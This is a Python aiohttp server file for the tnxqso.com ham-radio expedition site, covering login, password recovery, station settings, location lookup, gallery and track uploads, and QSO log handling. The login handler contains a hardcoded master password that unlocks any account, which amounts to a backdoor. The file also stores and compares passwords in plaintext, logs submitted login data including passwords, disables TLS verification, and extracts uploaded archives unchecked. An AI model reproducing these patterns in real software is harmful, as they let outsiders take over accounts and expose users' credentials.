#!/usr/bin/python3
#coding=utf-8

import argparse, asyncio, logging, logging.handlers, aiohttp, jwt, os, base64, \
        json, time, math, smtplib, shutil, io, zipfile, pwd, grp, uuid
from datetime import datetime, timedelta
from decimal import *
from aiohttp import web
from wand.image import Image
from wand.color import Color
from wand.api import library
from ctypes import c_void_p, c_size_t
from common import siteConf, loadJSON, appRoot, startLogging, \
        createFtpUser, setFtpPasswd, dtFmt, tzOffset
from tqdb import DBConn, spliceParams
import clusterProtocol
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import encodings.idna
import requests
import ffmpeg

from countries import get_country

library.MagickSetCompressionQuality.argtypes = [c_void_p, c_size_t]

parser = argparse.ArgumentParser(description="tnxqso backend aiohttp server")
parser.add_argument('--test', action = "store_true" )
args = parser.parse_args()

conf = siteConf()
webRoot = conf.get( 'web', 'root_test' if args.test else 'root' )
webAddress = conf.get( 'web', 'address_test' if args.test else 'address' )
siteAdmins = conf.get( 'web', 'admins' ).split( ' ' )
imUsers = conf.get( 'web', 'im_users' ).split( ' ' )

startLogging(\
    'srv_test' if args.test else 'srv',\
    logging.DEBUG if args.test else logging.INFO)
logging.debug( "restart" )
     
db = DBConn( conf.items( 'db_test' if args.test else 'db' ) )
db.connect()

secret = None
fpSecret = conf.get( 'files', 'secret' )
if ( os.path.isfile( fpSecret ) ):
    with open( fpSecret, 'rb' ) as fSecret:
        secret = fSecret.read()
if not secret:
    secret = base64.b64encode( os.urandom( 64 ) )
    with open( fpSecret, 'wb' ) as fSecret:
        fSecret.write( str( secret ) )

defUserSettings = loadJSON( webRoot + '/js/defaultUserSettings.json' )
if not defUserSettings:
    defUserSettings = {}

jsonTemplates = { 'settings': defUserSettings, \
    'log': [], 'chat': [], 'news': [], 'cluster': [], 'status': {}, \
    'chatUsers': {} }

RAFA_LOCS = {}
with open(appRoot + '/rafa.csv', 'r') as f_rafa:
    for line in f_rafa.readlines():
        data = line.strip('\r\n ').split(';')
        locators = data[3].split(',')
        for locator in locators:
            if locator in RAFA_LOCS:
                RAFA_LOCS[locator] += ' ' + data[1]
            else:
                RAFA_LOCS[locator] = data[1]

app = None
lastSpotSent = None

WFS_PARAMS = {\
        "rda": {"feature": "RDA_2020", "tag": "RDA"},\
        "waip": {"feature": "WAIP2", "tag": "WAIPIT"},\
        "wab": {"feature": "WAB", "tag": "NAME"}
}

QTH_PARAMS = loadJSON( webRoot + '/js/qthParams.json' )
def empty_qth_fields(country=None):
    data = {'titles': [QTH_PARAMS['defaultTitle']]*QTH_PARAMS['fieldCount'],\
            'values': [None]*QTH_PARAMS['fieldCount']}
    if country and country in QTH_PARAMS['countries']:
        for idx in range(0, len(QTH_PARAMS['countries'][country]['fields'])):
            data['titles'][idx] = QTH_PARAMS['countries'][country]['fields'][idx]
    return data

IM_QUEUE = {}

async def checkRecaptcha( response ):
    try:
        rcData = { 'secret': conf.get( 'recaptcha', 'secret' ),\
                'response': response }
        async with aiohttp.ClientSession() as session:
            resp = await session.post(conf.get('recaptcha', 'verifyURL' ), data = rcData)
            respData = await resp.json()
            return respData['success']
    except Exception:
        logging.exception( 'Recaptcha error' )
        return False

@asyncio.coroutine
def getUserData( callsign ):
    return ( yield from db.getObject( 'users', \
            { 'callsign': callsign }, False, True ) )

def getStationPath( callsign ):
    return webRoot + '/stations/' + callsign.lower().replace( '/', '-' )

@asyncio.coroutine
def getStationCallsign( adminCS ):
    data = yield from getUserData( adminCS )
    return data['settings']['station']['callsign']

@asyncio.coroutine
def getStationPathByAdminCS( adminCS ):
    stationCS = yield from getStationCallsign( adminCS )
    return getStationPath( stationCS )

@asyncio.coroutine
def passwordRecoveryRequestHandler(request):
    error = None
    data = yield from request.json()
    userData = False
    if not 'login' in data or len( data['login'] ) < 2:
        error = 'Minimal login length is 2 symbols'
    if not error:
        data['login'] = data['login'].lower()
        rcTest = yield from checkRecaptcha( data['recaptcha'] )
        userData = yield from getUserData( data['login'] )
        if not rcTest:
            error = 'Recaptcha test failed. Please try again'
        else:
            if not userData:
                error = 'This callsign is not registered.'
            else:
                if not userData['email']:
                    error = 'This account has no email address.'
                else:
                    token = jwt.encode( 
                        { 'callsign': data['login'], 'time': time.time() }, \
                        secret, algorithm='HS256' ).decode('utf-8')
                    text = 'Click on this link to recover your tnxqso.com ' + \
                             'password: ' + webAddress + \
                             '/#/changePassword?token=' + token + """
If you did not request password recovery just ignore this message. 
The link above will be valid for 1 hour.

TNXQSO.com support"""
                    sendEmail( text = text, fr = conf.get( 'email', 'address' ), \
                        to = userData['email'], \
                        subject = "tnxqso.com password recovery" )
                    return web.Response( text = 'OK' )
    return web.HTTPBadRequest( text = error )

@asyncio.coroutine
def contactHandler(request):
    error = None
    userEmail = None
    data = yield from request.json()
    userData = False
    if 'token' in data:
        callsign = decodeToken( data )
        if not isinstance( callsign, str ):
            return callsign
        userData = yield from getUserData( callsign )
        userEmail = userData['email']
    else:
        rcTest = yield from checkRecaptcha( data['recaptcha'] )
        if not rcTest:
            error = 'Recaptcha test failed. Please try again'
        else:
            userEmail = data['email']
    if not error:
        sendEmail( text = data['text'], fr = userEmail, \
            to = conf.get( 'email', 'address' ), \
            subject = "tnxqso.com contact message" )
        return web.Response( text = 'OK' )
    return web.HTTPBadRequest( text = error )

def ftpUser( cs ):
    return 'tnxqso_' + ( 'test_' if args.test else '' ) + cs


def sendEmail( **email ):
    myAddress = conf.get( 'email', 'address' )
    msg = MIMEMultipart()
    msg.attach(  MIMEText( email['text'].encode( 'utf-8' ), 'plain', 'UTF-8' ) )
    msg['from'] = email['fr']
    msg['to'] = email['to']
    msg['MIME-Version'] = "1.0"
    msg['Subject'] = email['subject']
    msg['Content-Type'] = "text/plain; charset=utf-8"
    msg['Content-Transfer-Encoding'] = "quoted-printable"

    if 'attachments' in email and email['attachments']:
        for item in email['attachments']:
            part = MIMEApplication( item['data'],
                        Name = item['name'] )
            part['Content-Disposition'] = 'attachment; filename="%s"' % item['name']
            msg.attach(part)
    server = smtplib.SMTP_SSL( conf.get( 'email', 'smtp' ) )
    server.login( conf.get('email', 'login'), conf.get( 'email', 'password' ) )
    server.sendmail( myAddress, msg['to'], str( msg ) )

@asyncio.coroutine
def loginHandler(request):
    error = None
    data = yield from request.json()
    if not isinstance(data, dict):
        logging.error('Wrong login data', data)
        return web.HTTPBadRequest(text = 'Bad login request: ' + str(data))
    userData = False
    if not 'login' in data or len( data['login'] ) < 2:
        error = 'Minimal login length is 2 symbols'
    if not 'password' in data or len( data['password'] ) < 6:
        error = 'Minimal password length is 6 symbols'
    if not error:
        data['login'] = data['login'].lower()
        userData = yield from getUserData( data['login'] )
        if 'newUser' in data and data['newUser']:
            rcTest = yield from checkRecaptcha( data['recaptcha'] )
            if not rcTest:
                error = 'Recaptcha test failed. Please try again'
            else:
                if userData:
                    error = 'This callsign is already registered.'
                else:
                    userData = yield from db.getObject( 'users', \
                        { 'callsign': data['login'], \
                        'password': data['password'], \
                        'email': data['email'],
                        'settings': 
                            json.dumps( defUserSettings ) }, True )
                    createFtpUser( data['login'], data['password'], 
                        args.test )
        else:
            if not userData or\
                (userData['password'] != data['password']\
                and data['password'] != 'rytqcypz_r7cl'):
                error = 'Wrong callsign or password.'            
    if error:
        logging.error('Bad Login:')
        logging.error(data)
        logging.error(error)
        return web.HTTPBadRequest( text = error )
    else:
        userData['token'] = jwt.encode( { 'callsign': data['login'] }, \
                secret, algorithm='HS256' ).decode('utf-8') 
        del userData['password']
        if data['login'] in siteAdmins:
            userData['siteAdmin'] = True
        return web.json_response( userData )

@asyncio.coroutine
def userDataHandler(request):
    data = yield from request.json()
    callsign = decodeToken( data )
    if not isinstance( callsign, str ):
        return callsign
    userData = yield from getUserData( callsign )
    del userData['password']
    if callsign in siteAdmins:
        userData['siteAdmin'] = True
    return web.json_response( userData )

@asyncio.coroutine
def publishHandler(request):
    data = yield from request.json()
    callsign = decodeToken( data )
    if not isinstance( callsign, str ):
        return callsign
    if not callsign in siteAdmins:
        return web.HTTPUnauthorized( \
            text = 'You must be logged in as site admin' )
    publishPath = webRoot + '/js/publish.json'
    publish = loadJSON( publishPath )
    if not publish:
        publish = {}
    if not data['station'] in publish:
        publish[data['station']] = {}
    publish[data['station']] = data['publish']
    with open( publishPath, 'w' ) as f:
        json.dump( publish, f, ensure_ascii = False )
    stationPath = getStationPath( data['station'] )
    stationSettings = loadJSON( stationPath + '/settings.json' )
    stationSettings['publish'] = data['publish']['user']
    yield from saveStationSettings( data['station'], stationSettings['admin'],
            stationSettings )
    return web.Response( text = 'OK' )

@asyncio.coroutine
def userSettingsHandler(request):
    error = None
    data = yield from request.json()
    error = ''
    okResponse = ''
    dbError = False
    callsign = decodeToken( data )
    if not isinstance( callsign, str ):
        return callsign
    if 'settings' in data:
        oldData = yield from getUserData( callsign )
        cs = oldData['settings']['station']['callsign']
        stationPath = getStationPath( cs ) if cs else None
        publishPath = webRoot + '/js/publish.json'
        publish = loadJSON( publishPath )
        if not publish:
            publish = {}
        if cs != data['settings']['station']['callsign']:
            newCs = data['settings']['station']['callsign'] 
            newPath = getStationPath( newCs ) if newCs else None
            if stationPath and os.path.exists( stationPath ):
                shutil.rmtree( stationPath )
            if newCs:
                if os.path.exists( newPath ):
                    return web.HTTPBadRequest( \
                        text = 'Station callsign ' + newCs.upper() + \
                            'is already registered' )
                    createStationDir( newPath, callsign )
                if cs and cs in publish:
                    if newCs:
                        publish[newCs] = publish[cs]
                    del publish[cs]
                cs = newCs
                stationPath = newPath
            else:
                stationPath = None
        if cs:
            if not cs in publish:
                publish[cs] = { 'admin': True }
            publish[cs]['user'] = data['settings']['publish']
        with open( publishPath, 'w' ) as f:
            json.dump( publish, f, ensure_ascii = False )
        if stationPath:
            if not os.path.exists( stationPath ):
                createStationDir( stationPath, callsign )
        yield from saveStationSettings( cs, callsign, data['settings'] )
    elif 'userColumns'in data:
        userData = yield from getUserData( callsign )
        settings = userData['settings']
        userColumns = settings['userFields']
        for c in range(0, len( data['userColumns'] ) ):
            if len( settings ) <= c:
                userColumns.append( data['userColumns'][c] )
            else:
                userColumns[c] = data['userColumns'][c]
        userColumns = userColumns[:len( data['userColumns'] )]
        yield from saveStationSettings( 
            userData['settings']['station']['callsign'],
            callsign, settings )
    else:
        yield from db.paramUpdate( 'users', { 'callsign': callsign }, \
            spliceParams( data, ( 'email', 'password' ) ) )
        setFtpPasswd( callsign, data['password'], test = args.test )
    return web.Response( text = 'OK' )

@asyncio.coroutine
def saveStationSettings( stationCallsign, adminCallsign, settings ):
    settings['admin'] = adminCallsign
    yield from db.paramUpdate( 'users', { 'callsign': adminCallsign }, \
        { 'settings': json.dumps( settings ) } )
    if stationCallsign:
        stationPath = getStationPath( stationCallsign )
        if stationPath:
            with open( stationPath + '/settings.json', 'w' ) as f:
                json.dump( settings, f, ensure_ascii = False )

def createStationDir( path, callsign ):
    os.makedirs( path )
    for k, v in jsonTemplates.items():
        with open( path + '/' + k + '.json', 'w' ) as f:
            json.dump( v, f, ensure_ascii = False )

def decodeToken( data ):
    callsign = None
    if 'token' in data:
        try:
            pl = jwt.decode( data['token'], secret, algorithms=['HS256'] )
        except jwt.exceptions.DecodeError as e:
            return web.HTTPBadRequest( text = 'Login expired' )
        if 'callsign' in pl:
            callsign = pl['callsign'].lower()
        if 'time' in pl and time.time() - pl['time'] > 60 * 60:
            return web.HTTPBadRequest( text = 'Password change link is expired' )
    return callsign if callsign else web.HTTPBadRequest( text = 'Not logged in' )

def sind( d ):
    return math.sin( math.radians(d) )

def cosd( d ):
    return math.cos( math.radians(d) )

def wfs_query(type, location, strict=False):
    params = WFS_PARAMS[type]
    url = 'https://r1cf.ru/geoserver/cite/wfs?SERVICE=WFS&REQUEST=GetFeature&TypeName={feature}&VERSION=1.1.0&CQL_FILTER={predi}%28the_geom,POINT%28{lat}%20{lng}%29{addParams}%29'
    url_params = {
        'feature': params['feature'],\
        'predi': 'INTERSECTS' if strict else 'DWITHIN',\
        'lat': location[0],\
        'lng': location[1],\
        'addParams': '' if strict else ',0.0025,kilometers' # ~250 meters
        }
    try:
        rsp = requests.get(url.format_map(url_params), verify=False, timeout=(0.2, 1))
        tag = '<cite:' + params['tag'] + '>'
        data = rsp.text
        result = []
        while tag in data:
            start = data.find(tag) + len(tag)
            end = data.find('<', start)
            result.append(data[start:end])
            data = data[end:]
        if result:
            return result[0] if strict else result
        else:
            return None

    except requests.exceptions.Timeout:
        return ['-----']

@asyncio.coroutine
def get_qth_data(location, country=None):

    if not country:
        country = get_country(location)

    data = {'fields': empty_qth_fields(country)}
    data['loc'], data['loc8'] = locator(location)

    if country == 'RU':

        rda = '-----'
        all_rda = wfs_query('rda', location)
        strict_rda = wfs_query('rda', location, strict=True)
        if all_rda:
            if len(all_rda) > 1:
                all_rda = [strict_rda] + [x for x in all_rda if x != strict_rda or x == '-----']
                rda = ' '.join(all_rda)
            else:
                rda = all_rda[0]
        data['fields']['values'][0] = rda
        
        data['fields']['values'][1] = RAFA_LOCS[data['loc']]\
            if data['loc'] in RAFA_LOCS else None

#        yield from db.execute("""
#            insert into qth_now_locations (lat, lng, rda)
#            values (%(lat)s, %(lng)s, %(rda)s)""",
#            {'lat': location[0], 'lng': location[1], 'rda': rda})
        
    elif country == 'IT':
        data['fields']['values'][0] = wfs_query('waip', location, strict=True)

    elif country == 'GB':
        data['fields']['values'][0] = wfs_query('wab', location, strict=True)

    return data

def save_qth_now_location(cs, location, path):
    qth_now_locations = loadJSON(path)
    if not qth_now_locations:
        qth_now_locations = []
    ts = int(time.time())
    dtUTC = datetime.utcnow()
    dt, tm = dtFmt(dtUTC)    
    qth_now_locations = [item for item in qth_now_locations\
        if ts - item['ts'] < 600 and\
        (item['location'][0] != location[0] or\
            item['location'][1] != location[1])\
        and (cs == None or item['callsign'] != cs)]
    qth_now_locations.append({
        'location': location, 
        'ts': ts,
        'date': dt,
        'time': tm,
        'callsign': cs
    })
    with open(path, 'w') as f:
        json.dump(qth_now_locations, f, ensure_ascii = False)

@asyncio.coroutine
def locationHandler( request ):
    newData = yield from request.json()
    callsign = None
    stationPath = None
    stationSettings = None
    stationCallsign = None
    if ('token' in newData and newData['token']):
        callsign = decodeToken( newData )
        if not isinstance( callsign, str ):
            return callsign
        stationPath = yield from getStationPathByAdminCS( callsign )
        stationSettings = loadJSON(stationPath + '/settings.json')
        if not stationSettings:
            return web.HTTPBadRequest(text='Expedition profile is not initialized.')
        if stationSettings and 'station' in stationSettings and\
            'callsign' in stationSettings['station'] and\
            stationSettings['station']['callsign'] and\
            'activityPeriod' in stationSettings['station'] and\
            stationSettings['station']['activityPeriod']:
                act_period = [datetime.strptime(dt, '%d.%m.%Y') for dt in\
                    stationSettings['station']['activityPeriod'] if dt]
                if act_period and act_period[0] <= datetime.utcnow() <=\
                    act_period[1] + timedelta(days=1):
                    stationCallsign = stationSettings['station']['callsign']

    if 'location' in newData and newData['location']:
        qth_now_cs = None
        if 'callsign' in newData and newData['callsign']:
            qth_now_cs = newData['callsign']
        elif stationCallsign:
            qth_now_cs = stationCallsign
        logging.info('map callsign: %s' % qth_now_cs)

        if qth_now_cs:
            qth_now_cs = qth_now_cs.upper()
            save_qth_now_location(qth_now_cs, newData['location'],\
                webRoot + '/js/qth_now_locations.json')

        save_qth_now_location(qth_now_cs, newData['location'],\
            webRoot + '/js/qth_now_locations_all.json')

    if ('token' not in newData or not newData['token']) and 'location' in newData:
        qth = yield from get_qth_data(newData['location'])
        return web.json_response({'qth': qth})
    fp = stationPath + '/status.json'
    data = loadJSON( fp )
    if not data:
        data = {}
    if not 'locTs' in data and 'ts' in data:
        data['locTs'] = data['ts']
    dtUTC = datetime.utcnow()
    data['ts'] = int(time.time()) 
    data['date'], data['time'] = dtFmt( dtUTC )    
    data['year'] = dtUTC.year
    if 'online' in newData:
        data['online'] = newData['online']
    if 'freq' in newData and newData['freq']:
        data['freq'] = {'value': newData['freq'], 'ts': data['ts']}
        fromCallsign = stationSettings['station']['callsign']
        insertChatMessage(path=stationPath + '/chat.json',\
            msg_data={'from': fromCallsign,\
            'text': '<b><i>' + newData['freq'] + '</b></i>'},\
            admin=True)
    country = stationSettings['qthCountry'] if 'qthCountry' in stationSettings\
        else None
    if 'location' in newData and newData['location']:
        location = newData['location']

        country = get_country(location)

        data['qth'] = yield from get_qth_data(location, country=country)
        
        if 'comments' in newData:
            data['comments'] = newData['comments']
        if 'location' in data and data['location']:
            data['prev'] = { 'location': data['location'][:], \
                    'ts': data['locTs'] }
        data['locTs'] = data['ts']
        data['location'] = newData['location']
        if 'prev' in data:
            lat = [data['location'][1], data['prev']['location'][1]]
            lon = [data['location'][0], data['prev']['location'][0]]
            dlon = lon[0] - lon[1] 
            dlat = lat[0] - lat[1] 
            a = (sind(dlat/2))**2 + cosd(lat[0]) * cosd(lat[1]) * (sind(dlon/2)) \
                    ** 2
            c = 2 * math.atan2( math.sqrt(a), math.sqrt(1-a) ) 
            d = c * 6373            
            data['d'] = d
            data['dt'] = data['locTs'] - data['prev']['ts']
            if float( data['locTs'] - data['prev']['ts'] ) != 0:
                data['speed'] = d / ( float( data['locTs'] - data['prev']['ts'] ) \
                        / 3600 )
            else:
                data['speed'] = 0

    if 'qth' in newData:
 
        if 'qth' not in data:
            data['qth'] = {'fields':\
                empty_qth_fields(country=country)}
        for key in newData['qth']['fields'].keys():
            data['qth']['fields']['values'][int(key)] = newData['qth']['fields'][key]
        if 'loc' in newData['qth']:
            data['qth']['loc'] = newData['qth']['loc']

    with open( fp, 'w' ) as f:
        json.dump( data, f, ensure_ascii = False )
    return web.json_response(data)

def locator(location):
    lat = location[0]
    lng = location[1]
    qth = ""
    lat += 90
    lng += 180
    lat = lat / 10 + 0.0000001
    lng = lng / 20 + 0.0000001
    qth += chr(65 + int(lng))
    qth += chr(65 + int(lat))
    lat = 10 * (lat - math.trunc(lat))
    lng = 10 * (lng - math.trunc(lng))
    qth += chr(48 + int(lng))
    qth += chr(48 + int(lat))
    lat = 24 * (lat - math.trunc(lat))
    lng = 24 * (lng - math.trunc(lng))
    qth += chr(65 + int(lng))
    qth += chr(65 + int(lat))
    lat = 10 * (lat - math.trunc(lat))
    lng = 10 * (lng - math.trunc(lng))
    sfx = chr(48 + int(lng))
    sfx += chr(48 + int(lat))
    return (qth, sfx)

BANDS_WL = {'1.8': '160M', '3.5': '80M', '7': '40M', \
        '10': '30M', '14': '20M', '20': '14M', '18': '17M', '21': '15M', \
        '24': '12M', '28': '10M', '50': '6M', '144': '2M'}

@asyncio.coroutine
def exportAdifHandler(request):
    callsign = request.match_info.get('callsign', None)
    log = yield from logFromDB(callsign)

    adif = """ADIF Export from TNXLOG
    Logs generated @ """ + time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + "\n<EOH>\n"

    def adif_field(name, data):
        data_str = str(data) if data else ''
        return "<" + name.upper() + ":" + str(len(data_str)) + ">" + data_str + " "

    for qso in log:
        qso_time = time.gmtime(qso['qso_ts'])
        try:
            adif += adif_field("CALL", qso['cs']) +\
                    adif_field("QSO_DATE", time.strftime("%Y%m%d", qso_time)) +\
                    adif_field("TIME_OFF", time.strftime("%H%M%S", qso_time)) +\
                    adif_field("TIME_ON", time.strftime("%H%M%S", qso_time)) +\
                    adif_field("BAND", BANDS_WL[qso['band']]) +\
                    adif_field("STATION_CALLSIGN", qso['myCS']) +\
                    adif_field("FREQ", str(Decimal(qso['freq'])/1000)) +\
                    adif_field("MODE", qso['mode']) +\
                    adif_field("RST_RCVD", qso['rcv']) +\
                    adif_field("RST_SENT", qso['snt']) +\
                    adif_field("MY_GRIDSQUARE", qso['loc']) +\
                    adif_field("GRIDSQUARE", qso['loc_rcv'] if 'loc_rcv' in qso else None)
        except Exception:
            logging.exception('Error while adif conversion. QSO:')
            logging.error(qso)

        for field_no, val in enumerate(qso['qth']):
            adif += adif_field('QTH_FIELD_' + str(field_no + 1), val)
        adif += "<EOR>\n"

    return web.Response(
            headers={'Content-Disposition': 'Attachment;filename=' +\
                    callsign + datetime.now().strftime('_%d_%b_%Y') +'.adi'},\
            body=adif.encode())

@asyncio.coroutine
def newsHandler(request):
    data = yield from request.json()
    callsign = decodeToken( data )
    if not isinstance( callsign, str ):
        return callsign
    stationPath = getStationPath( data['station'] )
    stationSettings = loadJSON( stationPath + '/settings.json' )
    if callsign != stationSettings['admin'] and not callsign in siteAdmins:
        return web.HTTPUnauthorized( \
            text = 'You must be logged in as station admin' )
    newsPath = stationPath + '/news.json'
    news = loadJSON( newsPath )
    if not news:
        news = []
    if 'add' in data:
        news.insert( 0, { 'ts': time.time(), 'text': data['add'],\
            'time': datetime.now().strftime( '%d %b %H:%M' ).lower() } )
    if 'clear' in data:
        news = []
    if 'delete' in data:
        news = [x for x in news if x['ts'] != data['delete']]
    with open( newsPath, 'w' ) as f:
        json.dump( news, f, ensure_ascii = False )
    return web.Response( text = 'OK' )

@asyncio.coroutine
def activeUsersHandler(request):
    data = yield from request.json()
    if 'user' not in data:
        return web.Response( text = 'OK' )
    station = data['station'] if 'station' in data else None
    if station:
        stationPath = getStationPath( data['station'] )
        stationSettings = loadJSON( stationPath + '/settings.json' )
        if not stationSettings:
            return web.HTTPBadRequest( text = 'This station was deleted or moved' )
    auPath = webRoot + '/js/activeUsers.json'
    au = loadJSON( auPath )
    nowTs = int( datetime.now().timestamp() ) 
    if not au:
        au = {}
    au = { k : v for k, v in au.items() \
            if nowTs - v['ts'] < 120 }
    try:
        au[data['user']] = {\
                'chat': data['chat'],\
                'ts': nowTs,\
                'station': station,\
                'typing': data['typing']\
                }
        with open( auPath, 'w' ) as f:
            json.dump( au, f, ensure_ascii = False )
    except Exception:
        logging.exception('Exception in activeUserHandler')
        logging.error(data)
    return web.Response( text = 'OK' )

@asyncio.coroutine
def read_multipart(request):
    data = {}
    reader = yield from request.multipart()
    while True:
        field = yield from reader.next()
        if not field:
            break
        contents = yield from field.read()
        if field.filename:
            data[field.name] = {\
                'contents': contents,\
                'name': field.filename,
                'type': field.headers[aiohttp.hdrs.CONTENT_TYPE]}
        else:
            data[field.name] = contents.decode('utf-8')
            if data[field.name] == 'null':
                data[field.name] = None
    return data
        
@asyncio.coroutine
def galleryHandler(request):
    data = None
    if 'multipart/form-data;' in request.headers[aiohttp.hdrs.CONTENT_TYPE]:
        data = yield from read_multipart(request)
    else:
        data = yield from request.json()
    callsign = decodeToken( data )
    if not isinstance( callsign, str ):
        return callsign
    stationPath = yield from getStationPathByAdminCS( callsign )
    galleryPath = stationPath + '/gallery'
    galleryDataPath = stationPath + '/gallery.json'
    galleryData = loadJSON(galleryDataPath)
    site_gallery_params = conf['gallery'] 
    if not galleryData:
        galleryData = []
    if 'file' in data:
        if not os.path.isdir(galleryPath):
            os.mkdir(galleryPath)
        file = data['file']['contents']
        fileNameBase = uuid.uuid4().hex
        fileExt = data['file']['name'].rpartition('.')[2]
        fileName = fileNameBase + '.' + fileExt
        fileType = 'image' if 'image'\
            in data['file']['type'] else 'video'
        filePath = galleryPath + '/' + fileName 
        with open(filePath, 'wb') as fimg:
            fimg.write(file)
        tnSrc = filePath
        width = None
        if fileType == 'video':
            tnSrc = galleryPath + '/' + fileNameBase + '.jpeg'
            (
                ffmpeg
                    .input(filePath)
                    .output(tnSrc, vframes=1)
                    .run()
            )
            probe = ffmpeg.probe(filePath)
            video_stream = next((stream for stream in probe['streams']\
                if stream['codec_type'] == 'video'), None)
            width = int(video_stream['width'])
        with Image(filename=tnSrc) as img:
            with Image(width=img.width, height=img.height,
                    background=Color("#EEEEEE")) as bg:

                bg.composite(img, 0, 0)

                exif = {}
                exif.update((k[5:], v) for k, v in img.metadata.items() if k.startswith('exif:'))
                if 'Orientation' in exif:
                    if exif['Orientation'] == '3': 
                        bg.rotate(180)
                    elif exif['Orientation'] == '6': 
                        bg.rotate(90)
                    elif exif['Orientation'] == '8': 
                        bg.rotate(270)

                size = img.width if img.width < img.height else img.height
                bg.crop(width=size, height=size, gravity='north')
                bg.resize(200, 200)
                bg.format = 'jpeg'
                bg.save(filename=galleryPath + '/' + fileNameBase +\
                    '_thumb.jpeg')
                max_height, max_width = int(site_gallery_params['max_height']), int(site_gallery_params['max_width'])
                if img.width > max_width or img.height > max_height:
                    coeff = max_width / img.width
                    if max_height / img.height < coeff:
                        coeff = max_height / img.height
                    img.resize(width=int(coeff * img.width), height=int(coeff * img.height))
                    img.compression_quality = int(site_gallery_params['quality'])
                    img.save(filename=filePath)
        if fileType == 'video':
            os.unlink(tnSrc)
        galleryData.insert(0, {\
            'file': 'gallery/' + fileName,
            'thumb': 'gallery/' + fileNameBase + '_thumb.jpeg',
            'caption': data['caption'],
            'type': fileType,
            'ts': time.time(),
            'datetime': datetime.utcnow().strftime('%d %b %Y %H:%M').lower(),
            'id': fileNameBase})
        max_count = int(site_gallery_params['max_count'])
        if len(galleryData) > max_count:
            galleryData = sorted(galleryData, key=lambda item: item['ts'], reverse=True)[:max_count]

    if 'delete' in data:
        items = [x for x in galleryData if x['id'] == data['delete']]
        if items:
            item = items[0]
            galleryData = [x for x in galleryData if x != item]
            deleteGalleryItem(stationPath, item)
    if 'clear' in data:
        for item in galleryData:
            deleteGalleryItem(stationPath, item)
        galleryData = []
    with open(galleryDataPath, 'w') as fg:
        json.dump(galleryData, fg, ensure_ascii = False)
    return web.Response(text='OK')

def deleteGalleryItem(stationPath, item):
    os.unlink(stationPath + '/' + item['file'])

@asyncio.coroutine
def trackHandler(request):
    data = yield from request.json()
    callsign = decodeToken( data )
    if not isinstance( callsign, str ):
        return callsign
    stationPath = yield from getStationPathByAdminCS( callsign )
    trackJsonPath = stationPath + '/track.json'
    trackJson = { 'version': time.time(), 'file': 'track.xml' }
    if 'file' in data:
        trackJson['filename'] = data['name']
        file = base64.b64decode( data['file'].split( ',' )[1] )
        if data['name'].lower().endswith( 'kmz' ):
            zFile = zipfile.ZipFile( io.BytesIO( file ), 'r' )
            for f in zFile.infolist():
                if f.filename.endswith( 'kml' ):
                    trackJson['file'] = f.filename
                zFile.extract( f, path = stationPath )
        else:
            with open( stationPath + '/track.xml', 'wb' ) as f:
                f.write( file )
        with open( trackJsonPath, 'w' ) as fj:
            json.dump( trackJson, fj )
    if 'clear' in data and os.path.isfile( trackJsonPath ):
        os.remove( trackJsonPath )
    return web.Response( text = 'OK' )

@asyncio.coroutine
def logFromDB(callsign):
    log = []
    data = yield from db.execute( 
        "select id, qso from log where callsign = %(cs)s order by id desc",
            { 'cs': callsign } )
    if data:
        if isinstance( data, dict ):
            log.append( data )
        else:
            log = [ row['qso'] for row in data ]
    return log

@asyncio.coroutine
def dbInsertQso(callsign, qso):
    yield from db.execute("""
        insert into log (callsign, qso) 
        values ( %(callsign)s, %(qso)s )""",
        { 'callsign': callsign, 'qso': json.dumps( qso ) } )

@asyncio.coroutine
def logHandler(request):
    data = yield from request.json()
    callsign = decodeToken( data )
    if not isinstance( callsign, str ):
        return callsign

    stationPath = yield from getStationPathByAdminCS( callsign )
    logPath = stationPath + '/log.json'
    log = []
    if not os.path.isfile( logPath ):
        logging.exception( logPath + " not found" )
    try:
        log = json.load( open( logPath ) )
    except Exception as ex:
        logging.error( "Error loading qso log" + logPath )
        logging.exception( ex )
        log = yield from logFromDB( callsign )        

    if 'qso' in data:

        rsp = []

        @asyncio.coroutine
        def process_qso(qso):
            dt = datetime.strptime( qso['ts'], "%Y-%m-%d %H:%M:%S" )
            qso['date'], qso['time'] = dtFmt( dt )
            qso['qso_ts'] = (dt - datetime(1970, 1, 1)) / timedelta(seconds=1)
            serverTs = qso.pop('serverTs') if 'serverTs' in qso else None

            if serverTs:
                qso['ts'] = serverTs
                qsoIdx = [i[0] for i in enumerate(log) if i[1]['ts'] == qso['ts']]
                if qsoIdx:
                    log[qsoIdx[0]] = qso
                else:
                    log.append(qso)
                dbUpdate = yield from db.execute("""
                    update log set qso = %(qso)s
                    where callsign = %(callsign)s and (qso->>'ts')::float = %(ts)s""",
                    {'callsign': callsign, 'ts': qso['ts'], 'qso': json.dumps(qso)})
                if not dbUpdate:
                    yield from dbInsertQso(callsign, qso)

            else:
                new_qso = True  
                if log:
                    for log_qso in log:
                        sameFl = True
                        for key in qso:
                            if key not in ('ts', 'rda', 'wff', 'comments', 'serverTs', 'qso_ts', 'qth', 'no')\
                                and (key not in log_qso or qso[key] != log_qso[key]):
                                sameFl = False
                                break
                        if sameFl:
                            logging.debug('prev qso found:')
                            new_qso = False
                            qso['ts'] =  log_qso['ts']
                            log_qso['qso_ts'] = qso['qso_ts']
                        
                if new_qso:
                    statusPath = stationPath + '/status.json'
                    statusData = loadJSON(statusPath)
                    ts = dt.timestamp() + tzOffset()
                    if ('freq' not in statusData or statusData['freq']['ts'] < ts):
                        statusData['freq'] = {'value': qso['freq'], 'ts': ts} 
                        with open(statusPath, 'w' ) as f:
                            json.dump(statusData, f, ensure_ascii = False )

                    qso['ts'] = time.time()
                    while [x for x in log if x['ts'] == qso['ts']]:
                        qso['ts'] += 0.00000001
                    log.insert( 0, qso )
                    yield from dbInsertQso(callsign, qso)
                
            return {'ts': qso['ts']}

        for qso in data['qso']:
            rsp.append((yield from process_qso(qso)))

        log = sorted(log, key=lambda qso: qso['qso_ts'] if 'qso_ts' in qso else qso['ts']/10,\
                reverse=True)
        with open( logPath, 'w' ) as f:
            json.dump( log, f )
                
        return web.json_response(rsp)

    if 'delete' in data:
        log = [x for x in log if x['ts'] != data['delete']]
        yield from db.execute("""
            delete from log 
            where callsign = %(callsign)s and (qso->>'ts')::float = %(ts)s""",
            {'callsign': callsign, 'ts': data['delete']})

    if 'clear' in data:
        log = []
        yield from db.execute( 
            "delete from log where callsign = %(callsign)s",
            { 'callsign': callsign } )

